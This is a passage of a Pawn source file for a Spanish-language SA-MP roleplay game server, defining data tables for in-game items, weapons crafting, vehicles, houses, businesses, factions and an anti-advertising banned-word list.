	{76, {2269.3008, -1679.5327, 15.6309, 88.9975}, 0, false, "Comprar ropa", "Comprar juguetes", "_", "_", "Carla Sanchez"}, 
	{184, {2262.4639, -1679.9022, 15.6209, 271.6491}, 0, false, "Comprar ropa", "Comprar juguetes", "_", "_", "Roger Sanchez"}
};
//Sistema de Toys
enum _@en@juguetesObjetos
{
	hmodelid, 
	hprice, 
	hmodelname[24]
};
new static const juguetesObjetos[][_@en@juguetesObjetos] = {
{18643, 100, "Laser-1"}, 
{19080, 100, "Laser-2"}, 
{19081, 100, "Laser-3"}, 
{19082, 100, "Laser-4"}, 
{19083, 100, "Laser-5"}, 
{19084, 100, "Laser-6"}, 
{18698, 200, "Insectos"}, 
{18636, 100, "GorroPolicia-1"}, 
{19099, 100, "GorroPolicia-2"}, 
{19100, 100, "GorroPolicia-3"}, 
{19161, 100, "SombreroPolicia-1"}, 
{19162, 100, "SombreroPolicia-2"}, 
{19200, 100, "CascoPolicia-1"}, 
{19138, 100, "LenterPolicia1"}, 
{19139, 100, "LenterPolicia2"}, 
{19140, 100, "LenterPolicia3"}, 
{18632, 100, "CañaPesca"}, 
{18633, 100, "Llave"}, 
{18635, 100, "Martillo"}, 
{18634, 100, "Palanca"}, 
{18638, 50, "Sombrero-1"}, 
{19093, 50, "Sombrero-2"}, 
{19160, 50, "Sombrero-3"}, 
{18639, 50, "SombreroNegro"}, 
{18640, 70, "Peluca"}, 
{18975, 70, "Peluca-2"}, 
{19136, 70, "Peluca-3"}, 
{19274, 70, "Peluca-4"}, 
{19516, 70, "Peluca-gris"}, 
{18641, 100, "Linterna"}, 
{18644, 50, "Desarmador"}, 
{18865, 50, "Teléfono-1"}, 
{18866, 50, "Teléfono-2"}, 
{18867, 50, "Teléfono-3"}, 
{18868, 50, "Teléfono-4"}, 
{18869, 50, "Teléfono-5"}, 
{18870, 100, "Teléfono-6"}, 
{18871, 100, "Teléfono-7"}, 
{18872, 100, "Teléfono-8"}, 
{18873, 100, "Teléfono-9"}, 
{18874, 100, "Teléfono-10"}, 
{18890, 50, "Rastrillo"}, 
{18891, 50, "Bandana1"}, 
{18892, 50, "Bandana2"}, 
{18893, 50, "Bandana3"}, 
{18894, 50, "Bandana4"}, 
{18895, 50, "Bandana5"}, 
{18896, 50, "Bandana6"}, 
{18897, 50, "Bandana7"}, 
{18898, 50, "Bandana8"}, 
{18899, 50, "Bandana9"}, 
{18900, 50, "Bandana10"}, 
{18901, 70, "Bandana11"}, 
{18902, 50, "Bandana12"}, 
{18903, 50, "Bandana13"}, 
{18904, 50, "Bandana14"}, 
{18905, 50, "Bandana15"}, 
{18906, 50, "Bandana16"}, 
{18907, 50, "Bandana17"}, 
{18908, 50, "Bandana18"}, 
{18909, 50, "Bandana19"}, 
{18910, 50, "Bandana20"}, 
{18911, 100, "Mask1"}, 
{18912, 100, "Mask2"}, 
{18913, 100, "Mask3"}, 
{18914, 100, "Mask4"}, 
{18915, 100, "Mask5"}, 
{18916, 100, "Mask6"}, 
{18917, 100, "Mask7"}, 
{18918, 100, "Mask8"}, 
{18919, 100, "Mask9"}, 
{18920, 100, "Mask10"}, 
{18921, 50, "Beret1"}, 
{18922, 50, "Beret2"}, 
{18923, 70, "Beret3"}, 
{18924, 100, "Beret4"}, 
{18925, 100, "Beret5"}, 
{18926, 50, "Sombrero1"}, 
{18927, 50, "Sombrero2"}, 
{18928, 50, "Sombrero3"}, 
{18929, 50, "Sombrero4"}, 
{18930, 50, "Sombrero5"}, 
{18931, 100, "Sombrero6"}, 
{18932, 100, "Sombrero7"}, 
{18933, 100, "Sombrero8"}, 
{18934, 100, "Sombrero9"}, 
{18935, 100, "Sombrero10"}, 
{18936, 50, "Chaleco1"}, 
{18937, 70, "Chaleco2"}, 
{18938, 100, "Chaleco3"}, 
{18939, 70, "Gorra1"}, 
{18940, 70, "Gorra2"}, 
{18941, 70, "Gorra3"}, 
{18942, 100, "Gorra4"}, 
{18943, 100, "Gorra5"}, 
{18944, 100, "Sombrero1"}, 
{18945, 120, "Sombrero2"}, 
{18946, 100, "Sombrero3"}, 
{18947, 100, "Sombrero1"}, 
{18948, 100, "Sombrero2"}, 
{18949, 100, "Sombrero3"}, 
{18950, 100, "Sombrero4"}, 
{18951, 100, "Sombrero5"}, 
{18952, 100, "CascoBox"}, 
{18953, 50, "Gorra1"}, 
{18954, 70, "Gorra2"}, 
{18955, 70, "Gorra3"}, 
{18956, 70, "Gorra4"}, 
{18957, 70, "Gorra5"}, 
{18958, 70, "Gorra6"}, 
{18959, 70, "Gorra7"}, 
{18960, 100, "Gorra8"}, 
{18961, 70, "Gorra9"}, 
{18962, 70, "Sombrero"}, 
{18964, 100, "SkullyGorra"}, 
{18965, 150, "SkullyGorra2"}, 
{18966, 100, "SkullyGorra3"}, 
{18967, 100, "HatMan1"}, 
{18968, 100, "HatMan2"}, 
{18969, 100, "HatMan3"}, 
{18970, 200, "HatTiger"}, 
{18971, 100, "HatCool1"}, 
{18972, 150, "HatCool2"}, 
{18973, 100, "HatCool3"}, 
{18974, 100, "MaskZorro"}, 
{18976, 100, "CascoMoto-1"}, 
{18977, 100, "CascoMoto-2"}, 
{18978, 150, "CascoMoto-3"}, 
{18979, 100, "CascoMoto-4"}, 
{19006, 50, "Lentes1"}, 
{19007, 50, "Lentes2"}, 
{19008, 50, "Lentes3"}, 
{19009, 50, "Lentes4"}, 
{19010, 50, "Lentes5"}, 
{19011, 50, "Lentes6"}, 
{19012, 50, "Lentes7"}, 
{19013, 50, "Lentes8"}, 
{19014, 50, "Lentes9"}, 
{19015, 50, "Lentes10"}, 
{19016, 100, "Lentes11"}, 
{19017, 100, "Lentes12"}, 
{19018, 100, "Lentes13"}, 
{19019, 100, "Lentes14"}, 
{19020, 100, "Lentes15"}, 
{19021, 100, "Lentes16"}, 
{19022, 100, "Lentes17"}, 
{19023, 100, "Lentes18"}, 
{19024, 100, "Lentes19"}, 
{19025, 100, "Lentes20"}, 
{19026, 100, "Lentes21"}, 
{19027, 100, "Lentes22"}, 
{19028, 100, "Lentes23"}, 
{19029, 100, "Lentes24"}, 
{19030, 100, "Lentes25"}, 
{19031, 100, "Lentes26"}, 
{19032, 100, "Lentes27"}, 
{19033, 100, "Lentes28"}, 
{19034, 100, "Lentes29"}, 
{19035, 100, "Lentes30"}, 
{19036, 200, "HockeyMask1"}, 
{19037, 200, "HockeyMask2"}, 
{19038, 200, "HockeyMask3"}, 
{19039, 50, "Reloj1"}, 
{19040, 50, "Reloj2"}, 
{19041, 50, "Reloj3"}, 
{19042, 50, "Reloj4"}, 
{19043, 50, "Reloj5"}, 
{19044, 50, "Reloj6"}, 
{19045, 50, "Reloj7"}, 
{19046, 100, "Reloj8"}, 
{19047, 100, "Reloj9"}, 
{19048, 100, "Reloj10"}, 
{19049, 100, "Reloj11"}, 
{19050, 100, "Reloj12"}, 
{19051, 100, "Reloj13"}, 
{19052, 100, "Reloj14"}, 
{19053, 100, "Reloj15"}, 
{19064, 100, "Santa-1"}, 
{19065, 200, "Santa-2"}, 
{19066, 300, "Santa-3"}, 
{19067, 100, "HoodyHat1"}, 
{19068, 100, "HoodyHat2"}, 
{19069, 100, "HoodyHat3"}, 
{19078, 700, "Loro-1"}, 
{19079, 700, "Loro-2"}, 
{19085, 500, "ParcheOjo"}, 
{19090, 100, "PomPomAzul"}, 
{19091, 100, "PomPomRojo"}, 
{19092, 100, "PomPomVerde"}, 
{19094, 200, "BurgerShotHat"}, 
{19095, 50, "CowboyHat1"}, 
{19096, 50, "CowboyHat3"}, 
{19097, 100, "CowboyHat4"}, 
{19098, 100, "CowboyHat5"}, 
{19101, 200, "ArmyHelmet1"}, 
{19102, 200, "ArmyHelmet2"}, 
{19103, 200, "ArmyHelmet3"}, 
{19104, 200, "ArmyHelmet4"}, 
{19105, 200, "ArmyHelmet5"}, 
{19106, 200, "ArmyHelmet6"}, 
{19107, 400, "ArmyHelmet7"}, 
{19108, 400, "ArmyHelmet8"}, 
{19109, 400, "ArmyHelmet9"}, 
{19110, 400, "ArmyHelmet10"}, 
{19111, 400, "ArmyHelmet11"}, 
{19112, 400, "ArmyHelmet12"}, 
{19113, 100, "SillyHelmet1"}, 
{19114, 200, "SillyHelmet2"}, 
{19115, 300, "SillyHelmet3"}, 
{19116, 50, "PlainHelmet1"}, 
{19117, 50, "PlainHelmet2"}, 
{19118, 70, "PlainHelmet3"}, 
{19119, 100, "PlainHelmet4"}, 
{19120, 100, "PlainHelmet5"}, 
{19137, 500, "CluckinBellHat"}, 
{19163, 100, "GimcMascara"}
};
//
static caracteresNovalidos[][2] = {{"."}, {"1"}, {"2"}, {"3"}, {"4"}, {"5"}, {"6"}, {"7"}, {"8"}, {"9"}, {"]"}, {"["}, {"{"}, {"}"}, {"-"}, {","}, {"@"}, {"$"}};
//Colores 
new const ColorAlpha[137] =
{
0xCD5C5C66, 0xF0808066, 0xFA807266, 0xE9967A66, 0xFFA07A66, 0xDC143C66, 0xFF000066, 
0xB2222266, 0x8B000066, 0x8B000066, 0xFFB6C166, 0xFF69B664, 0xFF149366, 0xC7158566, 
0xDB709366, 0xFFA07A66, 0xFF7F5066, 0xFF634766, 0xFF450066, 0xFF8C0066, 0xFFA50066, 
0xFFD70066, 0xFFFF0066, 0xFFFFE066, 0xFFFACD66, 0xFAFAD266, 0xFFEFD566, 0xFFE4B566, 
0xFFDAB966, 0xEEE8AA66, 0xF0E68C66, 0xBDB76B66, 0xE6E6FA66, 0xD8BFD866, 0xDDA0DD66, 
0xEE82EE66, 0xDA70D666, 0xFF00FF66, 0xBA55D366, 0x9370DB66, 0x8A2BE266, 0x9400D366, 
0x9932CC66, 0x8B008B66, 0x80008066, 0x4B008266, 0x6A5ACD66, 0x483D8B66, 0xADFF2F66, 
0x7FFF0066, 0x7CFC0066, 0x00FF0066, 0x32CD3266, 0x98FB9866, 0x90EE9066, 0x00FA9A66, 
0x00FF7F66, 0x3CB37166, 0x2E8B5766, 0x228B2266, 0x00800066, 0x00640066, 0x9ACD3266, 
0x6B8E2366, 0x80800066, 0x556B2F66, 0x66CDAA66, 0x8FBC8F66, 0x20B2AA66, 0x008B8B66, 
0x00808066, 0xE0FFFF66, 0xAFEEEE66, 0x7FFFD664, 0x40E0D066, 0x48D1CC66, 0x00CED166, 
0x5F9EA066, 0x4682B664, 0xB0C4DE66, 0xB0E0E666, 0xADD8E666, 0x87CEEB66, 0x87CEFA66, 
0x00BFFF66, 0x1E90FF66, 0x6495ED66, 0x7B68EE66, 0x4169E166, 0x0000FF66, 0x0000CD66, 
0x00008B66, 0x00008066, 0x19197066, 0xFFF8DC66, 0xFFEBCD66, 0xFFE4C664, 0xFFDEAD66, 
0xF5DEB366, 0xDEB88766, 0xD2B48C66, 0xBC8F8F66, 0xF4A46066, 0xDAA52066, 0xB8860B66, 
0xCD853F66, 0xD2691E66, 0x8B451366, 0xA0522D66, 0xA52A2A66, 0x80000066, 0xFFFFFF66, 
0xFFFAFA66, 0xF0FFF066, 0xF5FFFA66, 0xF0FFFF66, 0xF0F8FF66, 0xF8F8FF66, 0xF5F5F566, 
0xFFF5EE66, 0xF5F5DC66, 0xFDF5E666, 0xFFFAF066, 0xFAEBD766, 0xFAF0E666, 0xFFF0F566, 
0xFFE4E166, 0xDCDCDC66, 0xD3D3D366, 0xC0C0C066, 0xA9A9A966, 0x80808066, 0x69696966, 
0x77889966, 0x70809066, 0x2F4F4F66, 0x00000066};
//Sistema de barreras  |--->
enum _@en@barreras
{
    sCreated, 
    Float:sX, 
    Float:sY, 
    Float:sZ, 
    sObject, 
};
new barreras[MAX_BARRERAS][_@en@barreras];
//Sistema de Fabricas|--->
enum _@en@fabricas
{
	Float:f@entradasal[6], 
	f@int, 
	f@world, 
	Float:f@conq[3], 
	bool:f@estado, 
	f@tiempo, 
	Text3D:f@label, 
	f@Facc
}
new static fabricas[][_@en@fabricas] =
{
	{{123.3091, -298.4656, 1.5781, 2564.9592, -1305.3574, 1031.4219}, 2, 1, {89.7937, -305.7837, 1.5781}}
};
//
enum _@en@packFAB
{
	pf@nombre[24], 
	pf@requerido, 
	pf@item, 
	pf@unidades
}
new static const packFAB[14][_@en@packFAB] =
{
	{"Navaja", 25, 4, 1}, 
	{"Bate", 40, 5, 1}, 
	{"Katana", 80, 8, 1}, 
	{"C.Molotov", 750, 18, 2}, 
	{"9mm", 220, 22, 40}, 
	{"D.Eagle", 340, 24, 35}, 
	{"S.Pistol", 280, 23, 35}, 
	{"Shotgun", 250, 25, 15}, 
	{"SPAS12", 420, 27, 15}, 
	{"MP5", 190, 29, 35}, 
	{"AK47", 400, 30, 35}, 
	{"M4", 450, 31, 35}, 
	{"Rifle", 420, 33, 5}, 
	{"Sniper", 850, 34, 6}
};
//Sistema de bebidas |--->
enum _@en@Bebidas
{
	b@Nombre[20], 
	b@litros, 
	b@costo, 
	b@obj, 
	Float:b@Pos[9]
};
new const Bebidas[][_@en@Bebidas] =
{
	{"Ron 18 años", 5, 80, 19820, {0.056222, 0.010034, -0.231940, 0.000000, 0.000000, 0.000000, 1.053122, 0.885973, 0.570752}}, 
	{"Vodka", 5, 95, 19821, {0.065373, 0.029727, -0.247745, 0.000000, 0.000000, 0.000000, 1.053122, 0.885973, 0.466101}}, 
	{"Champagne", 5, 70, 19822, {0.065373, 0.029727, -0.247745, 0.000000, 0.000000, 0.000000, 1.053122, 0.885973, 0.466101}}, 
	{"Tequila", 4, 60, 19823, {0.065373, 0.029727, -0.247745, 0.000000, 0.000000, 0.000000, 1.053122, 0.885973, 0.466101}}, 
	{"Champagne Espumante", 4, 140, 19824, {0.065373, 0.029727, -0.247745, 0.000000, 0.000000, 0.000000, 1.053122, 0.885973, 0.804016}}, 
	{"Cerveza", 10, 30, 1543, {0.049328, 0.003846, -0.295036, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000}}, 
	{"Refresco", 3, 20, 1455, {0.051271, 0.028824, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000}}, 
	{"Agua", 3, 10, 1546, {0.063994, 0.060959, 0.031161, 0.735208, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000}}, 
	{"Cafe", 5, 15, 19835, {0.063340, 0.055408, 0.043436, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000}}
};
//Sistema de estado de emergencia  |--->
enum _@en@ESTemergencia
{
	ESTmodelo, 
	Float:ESTpos[3], 
	Float:ESTrot[3], 
	ESTobjeto
}
new bool:ESTemerg = false;
new static ESTemergencia[][_@en@ESTemergencia] = 
{
	{3578, {1539.73926, -1592.19055, 13.28440}, {0.00000, 0.00000, 269.62170}}, 
	{3578, {1419.88196, -1592.35742, 13.39250}, {0.00000, 0.00000, 88.17310}}, 
	{3578, {1429.44214, -1582.46899, 13.18060}, {0.00000, 0.00000, 359.53519}}, 
	{3578, {1539.13452, -1732.13855, 13.26360}, {0.00000, 0.00000, 269.67621}}, 
	{3578, {1398.59619, -1732.42749, 13.27920}, {0.00000, 0.00000, 269.67310}}, 
	{3877, {1539.19958, -1726.67651, 13.79082}, {0.00000, 0.00000, 359.39392}}, 
	{3877, {1539.22559, -1737.45325, 13.80107}, {0.00000, 0.00000, 359.69696}}, 
	{3877, {1398.78601, -1737.72253, 13.76961}, {0.00000, 0.00000, 0.00000}}, 
	{3877, {1398.64124, -1727.04089, 13.66457}, {0.00000, 0.00000, 0.00000}}, 
	{3877, {1419.67529, -1597.73828, 13.82239}, {0.00000, 0.00000, 359.79898}}, 
	{3877, {1420.22571, -1586.92566, 13.93151}, {0.00000, 0.00000, 0.20100}}, 
	{3877, {1424.19592, -1582.68689, 13.63471}, {0.00000, 0.00000, 0.00000}}, 
	{3877, {1434.88586, -1582.72424, 13.76295}, {0.00000, 0.00000, 0.00000}}, 
	{3877, {1539.73901, -1586.89819, 13.72038}, {0.00000, 0.00000, 2.29906}}, 
	{3877, {1539.62622, -1597.71265, 13.72038}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.15906, -1725.50037, 12.36475}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.30310, -1724.16968, 12.36475}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.28931, -1722.88196, 12.36475}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.29333, -1721.71472, 12.36475}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.29773, -1720.47510, 12.36475}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.30176, -1719.30688, 12.36475}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.30542, -1718.26807, 12.36475}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.24500, -1717.21411, 12.36475}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.18567, -1716.17786, 12.36475}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1398.69043, -1738.77002, 12.54074}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1398.65344, -1739.89917, 12.54074}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1398.61560, -1741.05530, 12.54074}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1398.68188, -1742.08777, 12.54074}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1398.52808, -1725.55127, 12.54074}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1398.63806, -1724.25623, 12.54074}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.16443, -1738.43652, 12.46374}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.22278, -1739.57104, 12.46374}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.18115, -1740.71960, 12.46374}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.34363, -1741.87646, 12.46374}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.56335, -1598.87366, 12.54002}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.52942, -1600.23730, 12.54002}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.51514, -1601.48792, 12.54002}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.56689, -1585.57642, 12.54002}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1539.54419, -1584.05383, 12.54002}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1419.63843, -1601.79211, 12.53246}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1419.49927, -1600.51489, 12.53246}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1419.45374, -1599.20496, 12.53246}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1420.59851, -1585.56995, 12.53936}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1421.91284, -1584.44250, 12.53936}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1436.15759, -1582.78979, 12.53936}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1423.12500, -1583.12927, 12.53936}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1437.27759, -1582.85327, 12.53936}, {0.00000, 0.00000, 0.00000}}, 
	{1237, {1438.35388, -1582.91431, 12.53936}, {0.00000, 0.00000, 0.00000}}
};

//Sistema de casas  |--->
enum _@en@casa
{
    hHouseid, 
    hOwned, 
    hOwner[MAX_PLAYER_NAME], 
    hUbicacion[MAX_PLAYER_NAME], 
    hNombre[MAX_PLAYER_NAME], 
	Float:hEntrancex, 
	Float:hEntrancey, 
	Float:hEntrancez, 
	Float:hExitx, 
	Float:hExity, 
	Float:hExitz, 
	hInt, 
    hLevel, 
	hValue, 
	hLock, 
	hRooms, 
	hRent, 
	hRentabil, 
	hWep, 
	hAmmo, 
    hMats, 
    hDrugs, 
    hSpeed, 
    hEctasy, 
    hRitalin, 
    hHeroina, 
    hMarihuana, 
	hWorld, 
	hTime, 
	Text3D:h3DText, 
	hPickup
};
new casa[MAX_HOUSES][_@en@casa];
//Sistema de negocios  |--->
enum _@en@negocio
{
	bID, 
	bOwned, 
	bOwner[24], 
	bName[32], 
    bExtortion[MAX_PLAYER_NAME], 
	Float:bEntrancex, 
	Float:bEntrancey, 
	Float:bEntrancez, 
	Float:bExitx, 
	Float:bExity, 
	Float:bExitz, 
	bLevelNeeded, 
	bInt, 
	bBuyPrice, 
	bTill, 
	bTillEx, 
	bProduc, 
	bcostenter, 
	bTime, 
	bUbicacion[24], 
	bEmpresa[24], 
	Text3D:b3DText, 
	bPickup, 
	
	//sistema de bolsa
	bRating, 
	bLastrating, 
	bDiario, 
	Float:bPrecioneto, 
	bPrecioFinal, 
	bEstado
};
new negocio[MAX_BIZZ][_@en@negocio];
//Sistema de autos  |--->
enum _@en@autos
{
	cCarid, 
	cModel, 
	Float:cLocationx, 
	Float:cLocationy, 
	Float:cLocationz, 
	Float:cAngle, 
	cColorOne, 
	cColorTwo, 
	cOwner[MAX_PLAYER_NAME], 
	cName[MAX_PLAYER_NAME], 
	cValue, 
	cOwned, 
	cLock, 
	cBattery, 
	cSpoiler, 
	cHood, 
	cRoof, 
	cSideskirt, 
	cNitro, 
	cLamps, 
	cExhaust, 
	cWheel, 
	cHydraulics, 
	cPaintjob, 
	cFrontBumper, 
	cRearBumper, 
	cVents, 
	cEmbargo, 
	cMulta, 
	cPlate[16], 
	cGas, 
	cAlarm, 
	cVehTime, 
	cGPS
};
new autos[VEHICULOS_COMPRABLES][_@en@autos];
new bool:cLuces[MAX_VEHICLES];
new bool:cCapo[MAX_VEHICLES];
//
new bool:autoVentana[MAX_VEHICLES char];
new Gas[MAX_VEHICLES];
//
enum _@en@visualizador
{
	visualModel[48], 
	Text:tdrawID[5], 
	visualCoche, 
	visualInt, 
	Float:visualPos[4], 
	bool:visualUse
}
new static visualizador[][_@en@visualizador] = 
{
	{{000, 451, 402, 411, 415, 429, 477, 480, 506, 541, 560, 562, 470, 565, 494, 603, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000}}, 
	{{000, 400, 401, 475, 404, 405, 410, 412, 413, 418, 419, 421, 422, 426, 439, 445, 458, 466, 489, 492, 507, 517, 535, 550, 558, 559, 567, 575, 579, 580, 587, 589, 403, 414, 428, 498, 467, 536, 566, 576, 555, 533, 482, 600, 543, 518, 542, 547}}, 
	{{000, 509, 510, 481, 462, 461, 521, 581, 463, 468, 471, 522, 586, 457, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000}}, 
	{{000, 487, 519, 593, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000, 000}}
};
//
enum _@en@vehiculosPrecios
{
	vPmodelo, 
	vPvalor, 
	vStockmax
}
new const vehiculosPrecios[][_@en@vehiculosPrecios] = 
{
	{411, 850000, 7}, 
	{451, 750000, 7}, 
	{402, 320000, 10}, 
	{415, 280000, 9}, 
	{429, 540000, 8}, 
	{477, 165000, 9}, 
	{480, 190000, 10}, 
	{506, 310000, 8}, 
	{541, 730000, 7}, 
	{560, 430000, 12}, 
	{562, 210000, 13}, 
	{470, 560000, 3}, 
	{565, 120000, 8}, 
	{494, 900000, 2}, 
	{603, 340000, 12}, 
	
	{509, 1000, 20}, 
	{510, 3500, 25}, 
	{481, 2300, 25}, 
	{462, 4500, 20}, 
	{461, 35000, 15}, 
	{521, 55000, 15}, 
	{581, 30000, 20}, 
	{463, 35000, 25}, 
	{468, 45000, 30}, 
	{471, 30000, 10}, 
	{522, 190000, 10}, 
	{586, 9000, 30}, 
	{457, 200000, 5}, 
	
	{400, 90000, 8}, 
	{401, 40000, 8}, 
	{475, 100000, 8}, 
	{404, 15000, 8}, 
	{405, 30000, 8}, 
	{410, 25000, 8}, 
	{412, 55000, 8}, 
	{413, 75000, 8}, 
	{418, 45000, 8}, 
	{419, 85000, 8}, 
	{421, 110000, 8}, 
	{422, 32000, 8}, 
	{426, 68000, 8}, 
	{439, 115000, 8}, 
	{445, 40000, 8}, 
	{458, 64000, 8}, 
	{466, 55000, 8}, 
	{489, 130000, 8}, 
	{492, 95000, 8}, 
	{507, 90000, 8}, 
	{517, 64000, 8}, 
	{535, 150000, 8}, 
	{550, 100000, 8}, 
	{558, 120000, 8}, 
	{559, 120000, 8}, 
	{567, 57000, 8}, 
	{575, 45000, 8}, 
	{579, 205000, 8}, 
	{580, 120000, 8}, 
	{587, 140000, 8}, 
	{589, 160000, 8}, 
	{403, 200000, 8}, 
	{414, 120000, 8}, 
	{428, 120000, 8}, 
	{498, 100000, 8}, 
	{467, 40000, 8}, 
	{536, 23000, 8}, 
	{566, 42000, 8}, 
	{576, 25000, 8}, 
	{555, 60000, 8}, 
	{533, 62000, 8}, 
	{482, 90000, 8}, 
	{600, 34000, 8}, 
	{543, 9000, 20}, 
	{518, 31000, 8}, 
	{542, 3400, 20}, 
	{547, 25000, 8}, 
	
	{487, 1500000, 5}, 
	{519, 2200000, 10}, 
	{593, 1300000, 10}
};
//Sistema de Texto Objectos  |--->
enum _@en@textObjeto
{
	tO@model, 
	Float:tO@pos[3], 
	Float:tO@rot[3], 
	tO@tmp[1024], 
	tO@mindex, 
	tO@msize, 
	tO@font[24], 
	tO@fontsize, 
	tO@bold, 
	tO@fontcolor, 
	tO@backcolor, 
	tO@malig, 
	tO@id
}
new static textObjeto[][_@en@textObjeto] = 
{
	{4729, {328.1854, 305.9259, 1000.0686}, {0.0000, 0.0000, -159.9580}, "{000000}Por favor leer:\n{ff0000}/reglas\n{000000}Leer los conceptos de rol:\n{FF0000}/DM /PG /MG /FK /CK", 0, 130, "impact", 16, 0, -16777216, 0, 1}, 
	{19353, {325.4718, 310.0523, 1000.2187}, {0.0000, 0.0000, -88.4466}, "IMPORTANTE\nsi acumulas mas de +7 jails\nse sumara +1 advertencia\nsi acumulas +3 advertencias\nquedas ban permanente.", 0, 100, "impact", 22, 0, -65536, 0, 1}
};

//Sistema de publicidad  |--->
enum ePublic{
	Float:_pPosx, 
	Float:_pPosy, 
	Float:_pPosz, 
	Float:_pPosrz, 
	_pTime, 
	_pObjecto
}
new Publicidad[MAX_ANUNCIOS][ePublic] = 
{
	{1565.3823, -1722.4117, 31.1648, -65.3286, 0}, 
	{1840.8491, -1836.7995, 24.9637, 109.9615, 0}, 
	{1353.7182, -1713.6779, 25.9378, 19.7334, 0}, 
	{1371.5417, -1268.1520, 43.5643, -160.7185, 0}, 
	{597.8134, -1744.8933, 33.2845, -170.5798, 0}, 
	{516.5975, -1724.7219, 31.6945, 12.8036, 0}, 
	{356.5889, -1718.1429, 27.3723, -159.9882, 0}, 
	{2236.5246, -1988.0124, 32.3765, 155.3182, 0}, 
	{2409.9284, -1555.9388, 42.4575, 90.1254, 0}, 
	{1850.5369, -1050.7419, 34.8862, -0.0366, 0}
};
//Sistema de palabras prohibidas  |--->
new static const prohibibas[][] = 
{
	{".com"}, 
	{".net"}, 
	{".org"}, 
	{".es"}, 
	{".tk"}, 
	{".nu"}, 
	{"servidor"}, 
	{"server"}, 
	{"optimus"}, 
	{"unplayer"}, 
	{"generationcity"}, 
	{"fenixzone"}, 
	{"lsrp"}, 
	{"oldschoolrp"}, 
	{"gamerzhosting"}, 
	{"superdanova"}, 
	{"Beyond"}
};
//Sistema de /articulos -
enum _@en@articulos
{
	Float:artPos[3], 
	artInt, 
	artWolrd
}
new static articulos[][_@en@articulos] = 
{
	{{1355.7881, -1761.9454, 13.5650}, 0, 0}, //Cerca del Ayuntamiento
	{{1926.1809, -1783.5812, 13.6216}, 0, 0}, //Cerca de ALHABRA
	{{2111.9468, -1737.8185, 13.6079}, 0, 0}, //Cerca de CARPINTERIA
	{{1834.2303, -1838.2747, 13.6699}, 0, 0}, //Cerca de unity
	{{1319.5765, -882.4855, 39.6969}, 0, 0}//Cerca de Vinelwood
};
enum _@en@RECpaquetes
{
	recPsaldo, 
	recPsms, 
	recPcosto
}
new static RECpaquetes[][_@en@RECpaquetes] = 
{
	{600, 30, 120}, 
	{1200, 60, 240}, 
	{1800, 90, 360}, 
	{2400, 120, 480}, 
	{3000, 150, 600}, 
	{3600, 180, 720}, 
	{4200, 210, 840}
};
//Sistema de facciones Ilegales  |--->
#define FACCIONES_ILEGALES_MAXIMAS 30
enum _@en@ifacc
{
	If@usada, 
	If@nombre[32], 
	If@rango0[12], 
	If@rango1[12], 
	If@rango2[12], 
	If@rango3[12], 
	If@rango4[12], 
	If@rango5[12], 
	If@boveda, 
	If@armas[20], 
	If@drogas[20], 
	Float:If@pos[3], 
	Float:If@bpos[3], 
	If@color, 
	Text3D:If@3dlabel, 
	If@pick, 
	If@gang, 
	Text3D:If@b3dlabel, 
	If@bpick
}
new IFacciones[FACCIONES_ILEGALES_MAXIMAS][_@en@ifacc];
//Rangos
enum _@en@fRangos
{
	fr@rango0[24], 
	fr@rango1[24], 
	fr@rango2[24], 
	fr@rango3[24], 
	fr@rango4[24], 
	fr@rango5[24], 
	fr@rango6[24], 
	fr@rango7[24]
}
new const fRangos[][_@en@fRangos] = 
{
	{{"Civil"}, {"Civil"}, {"Civil"}, {"Civil"}, {"Civil"}, {"Civil"}, {"Civil"}, {"Civil"}}, 
	{{"Cadete"}, {"Oficial"}, {"Agente"}, {"Sargento"}, {"Capitán"}, {"Comandante"}, {"Civil"}, {"Civil"}}, 
	{{"Cabo"}, {"Soldado"}, {"Trooper"}, {"Sargento"}, {"Teniente"}, {"Capitán"}, {"Mayor"}, {"Coronel"}}, 
